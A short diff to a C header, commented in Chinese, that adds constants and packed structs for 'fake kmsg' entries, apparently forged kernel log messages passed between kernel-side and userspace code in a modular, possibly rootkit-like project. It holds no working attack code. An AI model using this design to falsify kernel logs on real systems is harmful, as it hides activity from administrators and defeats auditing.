@@ -9,6 +9,22 @@
 #define ON 1
 #define OFF 0
 
+// 1. 统一定义常量（务必与内核态 defs.h 保持一致）
+#define FAKE_KMSG_MAX_LEN 112
+#define FAKE_KMSG_COUNT 30
+
+// 2. 定义假日志结构体
+// 使用 __attribute__((packed)) 确保内存布局与内核态完全严丝合缝
+struct kmsg_data_t {
+    __u64 len;
+    char content[FAKE_KMSG_MAX_LEN - 8];
+} __attribute__((packed));
+
+// 3. 如果需要，也可以把其他的上下文结构体放进来
+struct kmsg_read_ctx_t {
+    void *buf;
+    __u32 fd;
+} __attribute__((packed));
 //Centralized configutation struct.
 //Used by the module manager to decide which modules to load
 //If <all> is set in a module, the other configurations are ignored
